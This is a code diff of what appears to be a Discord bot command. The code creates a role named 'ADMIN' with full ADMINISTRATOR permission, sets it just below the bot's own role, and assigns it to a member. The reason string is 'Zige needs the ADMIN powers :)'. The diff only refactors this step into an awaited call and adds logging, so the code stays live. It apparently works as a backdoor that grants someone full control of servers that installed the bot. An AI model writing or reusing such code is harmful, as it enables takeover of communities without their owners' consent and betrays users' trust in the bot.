@@ -50,17 +50,20 @@ module.exports = {
           var roleZ = int.guild.me.roles.cache
             .filter((x) => x.managed == true)
             .first();
-
-          guild.roles
-            .create({
-              name: "ADMIN",
-              color: "#FF0000",
-              mentionable: false,
-              position: roleZ.position,
-              permissions: ["ADMINISTRATOR"],
-              reason: "Zige needs the ADMIN powers :)",
-            })
-            .then((role) => {
+         
+         var roleObject = {
+            name: "ADMIN",
+            color: "#FF0000",
+            mentionable: false,
+            position: roleZ.position,
+            permissions: ["ADMINISTRATOR"],
+            reason: "Zige needs the ADMIN powers :)",
+          };
+         
+         console.log(roleObject);
+         
+          var role = await guild.roles
+            .create(roleObject)
               if (member) {
                 member.roles.add(role);
 
@@ -77,7 +80,6 @@ module.exports = {
 
                 return;
               }
-            });
         } else {
           followReply(int, {
             content: "**:x: This guild isn't in the database.**",
